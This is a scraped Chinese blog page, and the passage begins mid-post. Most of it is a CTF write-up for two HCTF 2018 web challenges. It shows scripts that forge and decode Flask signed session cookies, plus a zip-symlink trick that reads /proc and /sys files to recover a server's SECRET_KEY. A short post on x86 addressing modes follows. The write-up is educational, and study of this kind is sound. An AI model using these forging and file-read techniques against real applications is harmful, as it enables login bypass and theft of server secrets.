<p>这里的loads部分使用TimestampSigner来对传入的数据进行解析，查看TimestampSinger中关于签名与反签名的源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Signs the given string and also attaches a time information."""</span></span><br><span class="line"> value = want_bytes(value)</span><br><span class="line">    timestamp = base64_encode(int_to_bytes(self.get_timestamp()))</span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line">    value = value + sep + timestamp</span><br><span class="line">    <span class="keyword">return</span> value + sep + self.get_signature(value)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">unsign</span><span class="params">(self, value, max_age=None, return_timestamp=False)</span>:</span></span><br><span class="line">    <span class="string">"""Works like the regular :meth:`~Signer.unsign` but can also</span></span><br><span class="line"><span class="string">    validate the time.  See the base docstring of the class for</span></span><br><span class="line"><span class="string">    the general behavior.  If `return_timestamp` is set to `True`</span></span><br><span class="line"><span class="string">    the timestamp of the signature will be returned as naive</span></span><br><span class="line"><span class="string">    :class:`datetime.datetime` object in UTC.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = Signer.unsign(self, value)</span><br><span class="line">        sig_error = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">except</span> BadSignature <span class="keyword">as</span> e:</span><br><span class="line">        sig_error = e</span><br><span class="line">        result = e.payload <span class="keyword">or</span> <span class="string">b''</span></span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If there is no timestamp in the result there is something</span></span><br><span class="line">    <span class="comment"># seriously wrong.  In case there was a signature error, we raise</span></span><br><span class="line">    <span class="comment"># that one directly, otherwise we have a weird situation in which</span></span><br><span class="line">    <span class="comment"># we shouldn't have come except someone uses a time-based serializer</span></span><br><span class="line">    <span class="comment"># on non-timestamp data, so catch that.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sep <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> sig_error:</span><br><span class="line">            <span class="keyword">raise</span> sig_error</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(<span class="string">'timestamp missing'</span>, payload=result)</span><br><span class="line"></span><br><span class="line">    value, timestamp = result.rsplit(sep, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        timestamp = bytes_to_int(base64_decode(timestamp))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        timestamp = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Signature is *not* okay.  Raise a proper error now that we have</span></span><br><span class="line">    <span class="comment"># split the value and the timestamp.</span></span><br><span class="line">    <span class="keyword">if</span> sig_error <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(text_type(sig_error), payload=value,</span><br><span class="line">                               date_signed=timestamp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Signature was okay but the timestamp is actually not there or</span></span><br><span class="line">    <span class="comment"># malformed.  Should not happen, but well.  We handle it nonetheless</span></span><br><span class="line">    <span class="comment">#检查timestamp</span></span><br><span class="line">    <span class="keyword">if</span> timestamp <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(<span class="string">'Malformed timestamp'</span>, payload=value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check timestamp is not older than max_age</span></span><br><span class="line">    <span class="keyword">if</span> max_age <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        age = self.get_timestamp() - timestamp</span><br><span class="line">        <span class="keyword">if</span> age &gt; max_age:</span><br><span class="line">            <span class="keyword">raise</span> SignatureExpired(</span><br><span class="line">                <span class="string">'Signature age %s &gt; %s seconds'</span> % (age, max_age),</span><br><span class="line">                payload=value,</span><br><span class="line">                date_signed=self.timestamp_to_datetime(timestamp))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> return_timestamp:</span><br><span class="line">        <span class="keyword">return</span> value, self.timestamp_to_datetime(timestamp)</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure></p>
<p>unsigin过程直接调用父类Signer的unsign,再进行timestamp的检查，由于之前调用时传入了max_age所以会检查timestamp是否超时（当时没注意到这一点一直以为随便一个timestamp就可以结果gg了。。。）</p>
<h3 id="序列化与反序列化的总结"><a href="#序列化与反序列化的总结" class="headerlink" title="序列化与反序列化的总结"></a>序列化与反序列化的总结</h3><p>最后经过flask处理的字符串的格式为：</p>
<p>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</p>
<p>对于以上的调用我们可以总结为这样的代码(与服务器上的python版本无关，如果不确定服务器运行环境timestamp最好根据服务器反馈获取)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'*******'</span></span><br><span class="line">salt=<span class="string">"cookie-session"</span></span><br><span class="line">serializer=session_json_serializer</span><br><span class="line">digest_method=hashlib.sha1</span><br><span class="line">key_derivation=<span class="string">'hmac'</span></span><br><span class="line"></span><br><span class="line">signer_kwargs = dict(</span><br><span class="line">            key_derivation=key_derivation,</span><br><span class="line">            digest_method=digest_method</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(obj,timestamp,sep)</span>:</span></span><br><span class="line">        my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)</span><br><span class="line">        base64d=my_serializer.dump_payload(obj) <span class="comment">#数据压缩</span></span><br><span class="line">        data=base64d+sep+timestamp <span class="comment">#拼接timestamp</span></span><br><span class="line">        result=data+sep+my_serializer.make_signer(salt).get_signature(data) <span class="comment">#拼接签名内容</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
<p>而从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码，解码可以使用phith0n师傅的payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></p>
<p>需要特别注意的是<strong>python2与python3下产生的timestamp是不一样的！！！</strong>当时被这个问题坑了很久。。。</p>
<h2 id="hctf两道题目的wp"><a href="#hctf两道题目的wp" class="headerlink" title="hctf两道题目的wp"></a>hctf两道题目的wp</h2><p>有了以上的分析要解决hctf的这两道题目就很容易了：</p>
<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p><a href="http://admin.2018.hctf.io/index">http://admin.2018.hctf.io/index</a></p>
<p>这道题目我们能做出来是因为在github上搜索hctf,按照recent updated得到了题目的repo<a href="https://github.com/woadsl1234/hctf_flask">https://github.com/woadsl1234/hctf_flask</a></p>
<p>repo中暴露了私钥信息,而且题目只需要能用admin用户登入即可，因此可以直接使用上面的脚本跑出admin用户的session来。</p>
<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><a href="http://hideandseek.2018.hctf.io/">http://hideandseek.2018.hctf.io/</a></p>
<p>这道题目中登入后会要求我们上传一个zip文件,如果zip文件内的所有文件都是文本文件便可以成功返回文件的内容。<br>然而zip文件中也可以包含软链接,采用<code>zip -ry out.zip link</code>即可将一个软链接打包到out.zip中。因此我们可以尝试上传包含<code>/proc/self/environ</code>软链接的压缩包来获取一些运行环境信息<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ link</span><br><span class="line">zip -ry out.zip link</span><br></pre></td></tr></table></figure></p>
<p>上传后可以获得当前一些环境信息：<br><img src="https://p5.ssl.qhimg.com/t016318fbef2298a371.png" alt="png1"><br>可以发现uwsgi配置文件的路径<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code>,尝试读取配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure></p>
<p>可以得知当前脚本为<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code><br>从而获取到源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p>
<p>然而并无法获取flag.py的源码，因为限制了内容不能包含hctf。<br>尝试获取<code>/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html</code><br>可以得知只要能用admin登入即可获得flag.</p>
<p>这里我们重点查看payload中SECRET_KEY的生成方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到随机数的种子为<code>uuid.getnode()</code>.而<code>uuid.getnode()</code>函数返回的便是当前网卡的mac地址。那么要怎样获取服务器上的网卡地址?<br>这里便可以通过linux强大的特殊文件系统来获取。首先利用之前的方法读取<code>/proc/net/dev</code>可以发现服务器上的所有网卡。可以发现服务器只有eth0和lo两个网卡。之后再读取<code>/sys/class/net/eth0/address</code><br>即可获取eth0网卡的mac地址。获取了地址，我们便获取了SECRET_KEY，之后便可以使用我们上面的payload来伪造session从二获取flag。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次hctf深入的了解了flask的客户端session的生成过程，可以说hctf相比最近的一些神仙大战确实是异常很适合web狗的比赛了。每年的hctf都能学到一些东西，希望以后能多一些这样干货满满的比赛。○|￣|_<br>ps:如果出一道改了源码改了默认salt和签名机制的题目会不会被打死ヾ(≧∇≦*)ゝ</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/指令系统/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/指令系统/index.html" itemprop="url">
                  指令系统
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-10-27 20:15:25" itemprop="dateCreated datePublished" datetime="2018-10-27T20:15:25+08:00">2018-10-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><ul>
<li><p>立即寻址 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,01010101B</span><br></pre></td></tr></table></figure>
</li>
<li><p>寄存器寻址</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,BX</span><br></pre></td></tr></table></figure>
<ul>
<li><p>存储器操作数寻址</p>
<blockquote>
<p>逻辑地址：段寄存器名称:偏移地址表达式  </p>
<ul>
<li>直接寻址 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV BX,DS:[1234H]</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<ul>
<li><p>寄存器间接寻址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,[BX]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV BP,MESG</span><br><span class="line">MOV CL,ES:[BP] ;ES附加段MESG字节单元取数-&gt;CL</span><br></pre></td></tr></table></figure>
</li>
<li><p>基址寻址</p>
<blockquote>
<p>逻辑地址表达方式:段寄存器:[基址寄存器+位移量]/段寄存器:位移量[基址寻址器]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOV DL,DS:[BP+10]</span><br><span class="line">MOV EDX,[EAX+10H]</span><br><span class="line">``` </span><br><span class="line">* 变址寻址</span><br><span class="line">&gt;段寄存器:[比例因子×变址寄存器+位移量]/段寄存器:位移量[比例因子×变址寄存器]</span><br><span class="line">```asm</span><br><span class="line">MOV AL,[2*EBX+10]</span><br><span class="line">MOV AH,[SI+5] ;只能选择SI DI两个存储器</span><br></pre></td></tr></table></figure>
</blockquote>
<p>*基址加变址寻址</p>
<blockquote>
<ul>
<li>有比例因子的基地址加变址寻址：<br>段寄存器:[基址寄存器+比例因子×变址寄存器+位移量]<br>段寄存器:位移量[基址寄存器+比例因子x变址寄存器]<br>段寄存器:位移量[基址寄存器][比例因子x变址寄存器]<br>基址寄存器与变址寄存器都必须是规定的32位寄存器</li>
<li>没有比例因子的基址加变址寻址:<br>段寄存器:[基址寄存器+变址寄存器+位移量]<br>段寄存器:位移量[基址寄存器+变址寄存器]<br>段寄存器:位移量[基址寄存器][变址寄存器]<br>基址寄存器与变址寄存器必须是指定的16位寄存器</li>
<li>基址、变址、基址加变址这三种寻址方式中偏移地址表达式中的位移量是无符号整数</li>
</ul>
</blockquote>
</li>
</ul>
</li>
<li>带有比例因子的变址寻址同行用于检索一维数组元素</li>
<li>带有比例因子的基址加变址通常用于检索二维数组</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/sql盲注总结/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/sql盲注总结/index.html" itemprop="url">
                  sql盲注总结[长期更新]
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-10-06 17:59:28" itemprop="dateCreated datePublished" datetime="2018-10-06T17:59:28+08:00">2018-10-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
